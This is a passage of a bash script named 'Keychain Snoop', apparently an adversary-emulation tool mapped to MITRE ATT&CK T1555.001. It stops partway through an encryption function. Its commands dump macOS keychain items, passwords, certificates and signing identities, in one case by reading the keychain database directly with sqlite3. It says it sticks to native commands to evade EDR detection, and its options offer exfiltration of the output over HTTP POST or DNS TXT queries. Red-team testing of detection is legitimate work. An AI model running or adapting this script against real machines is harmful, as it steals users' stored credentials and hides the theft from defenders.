#!/bin/bash

# Script Name: Keychain Snoop
# MITRE ATT&CK Technique: T1555.001
# Author: Daniel A. | github.com/darmado | x.com/darmad0
# Date: 2024-10-12
# Version: 1.0

# Description:
# This script attempts to extract credentials stored in macOS keychains using various built-in commands to simulate potential adversary behavior. Only native macOS commands are used to avoid detection by common EDRs.

# References:
# - https://attack.mitre.org/techniques/T1555/001/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md

# Global Variables
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
CHUNK_SIZE=1000  # Default chunk size
LOG_FILE="T1555.001_keychain_snoop.log"

# MITRE ATT&CK Mappings
TACTIC="Credential Access"
TTP_ID="T1555.001"

# Command definitions
CMD='security dump-keychain login.keychain'
CMD_FIND_GENERIC='security find-generic-password -a <account> -s <service>'
CMD_FIND_INTERNET='security find-internet-password -a <account> -s <server>'
CMD_FIND_CERT='security find-certificate -a -p'
CMD_UNLOCK_KEYCHAIN='security unlock-keychain login.keychain'
CMD_EXPORT_ITEMS='security export -k login.keychain -t certs -f pem -o exported_items.pem'
CMD_FIND_IDENTITY='security find-identity -v -p codesigning'
CMD_STRINGS_KEYCHAIN='strings ~/Library/Keychains/login.keychain-db'
CMD_SQLITE_DUMP='sqlite3 ~/Library/Keychains/login.keychain-db .dump'

# Arrays to store checks
CHECKS=()

#FunctionType: utility
display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Description:"
    echo "  Attempts to dump macOS keychain items to extract credentials."
    echo ""
    echo "Options:"
    echo "  General:"
    echo "    --help                 Show this help message"
    echo "    --verbose              Enable detailed output"
    echo "    --log                  Log output to file (rotates at 5MB)"
    echo ""
    echo "  Output Processing:"
    echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
    echo ""
    echo "  Data Exfiltration:"
    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
    echo ""
    echo "  Credential Access Commands:"
    echo "    --check=keychain_dump              Attempt to dump keychain items"
    echo "    --check=find_generic_password      Attempt to find a generic password in keychain"
    echo "    --check=find_internet_password     Attempt to find an internet password in keychain"
    echo "    --check=find_certificate           Attempt to find certificates in keychain"
    echo "    --check=unlock_keychain            Attempt to unlock keychain"
    echo "    --check=export_items               Attempt to export items from keychain"
    echo "    --check=find_identity              Attempt to find identity used for code signing"
    echo "    --check=strings_keychain           Attempt to read keychain strings"
    echo "    --check=sqlite_dump                Attempt to dump keychain using sqlite3"
}

#FunctionType: utility
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

#FunctionType: utility
log_to_stdout() {
    local msg="$1"
    local function_name="$2"
    local command="$3"
    local timestamp=$(get_timestamp)
    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: "$command""
    
    echo "$log_entry"
    
    if [ "$LOG_ENABLED" = true ]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

#FunctionType: utility
validate_permissions() {
    if [ "$EUID" -ne 0 ]; then
        echo "Error: Root permissions are required to execute this action. Please run as root or use sudo."
        exit 1
    fi
}

#FunctionType: attackScript
cmd_security_dump() {
    eval "$CMD" 2>&1
}

#FunctionType: attackScript
cmd_find_generic_password() {
    eval "$CMD_FIND_GENERIC" 2>&1
}

#FunctionType: attackScript
cmd_find_internet_password() {
    eval "$CMD_FIND_INTERNET" 2>&1
}

#FunctionType: attackScript
cmd_find_certificate() {
    eval "$CMD_FIND_CERT" 2>&1
}

#FunctionType: attackScript
cmd_unlock_keychain() {
    validate_permissions
    eval "$CMD_UNLOCK_KEYCHAIN" 2>&1
}

#FunctionType: attackScript
cmd_export_items() {
    eval "$CMD_EXPORT_ITEMS" 2>&1
}

#FunctionType: attackScript
cmd_find_identity() {
    eval "$CMD_FIND_IDENTITY" 2>&1
}

#FunctionType: attackScript
cmd_strings_keychain() {
    eval "$CMD_STRINGS_KEYCHAIN" 2>&1
}

#FunctionType: attackScript
cmd_sqlite_dump() {
    eval "$CMD_SQLITE_DUMP" 2>&1
}

#FunctionType: attackScript
execute_ttp() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "keychain_dump")
            log_to_stdout "Attempting to dump keychain items" "execute_ttp" "$CMD"
            output+=$(cmd_security_dump)
            ;;
        "find_generic_password")
            log_to_stdout "Attempting to find generic password" "execute_ttp" "$CMD_FIND_GENERIC"
            output+=$(cmd_find_generic_password)
            ;;
        "find_internet_password")
            log_to_stdout "Attempting to find internet password" "execute_ttp" "$CMD_FIND_INTERNET"
            output+=$(cmd_find_internet_password)
            ;;
        "find_certificate")
            log_to_stdout "Attempting to find certificates" "execute_ttp" "$CMD_FIND_CERT"
            output+=$(cmd_find_certificate)
            ;;
        "unlock_keychain")
            log_to_stdout "Attempting to unlock keychain" "execute_ttp" "$CMD_UNLOCK_KEYCHAIN"
            output+=$(cmd_unlock_keychain)
            ;;
        "export_items")
            log_to_stdout "Attempting to export items from keychain" "execute_ttp" "$CMD_EXPORT_ITEMS"
            output+=$(cmd_export_items)
            ;;
        "find_identity")
            log_to_stdout "Attempting to find identity" "execute_ttp" "$CMD_FIND_IDENTITY"
            output+=$(cmd_find_identity)
            ;;
        "strings_keychain")
            log_to_stdout "Attempting to read keychain strings" "execute_ttp" "$CMD_STRINGS_KEYCHAIN"
            output+=$(cmd_strings_keychain)
            ;;
        "sqlite_dump")
            log_to_stdout "Attempting to dump keychain using sqlite3" "execute_ttp" "$CMD_SQLITE_DUMP"
            output+=$(cmd_sqlite_dump)
            ;;
        *)
            output+="Unknown check type: $check_type\n"
            ;;
    esac

    echo "$output"
}

#FunctionType: utility
encode_output() {
    local data="$1"
    case $ENCODE in
        b64)
            echo "$data" | base64
            ;;
        hex)
            echo "$data" | xxd -p
            ;;
        *)
            echo "$data"
            ;;
    esac
}

#FunctionType: utility
encrypt_output()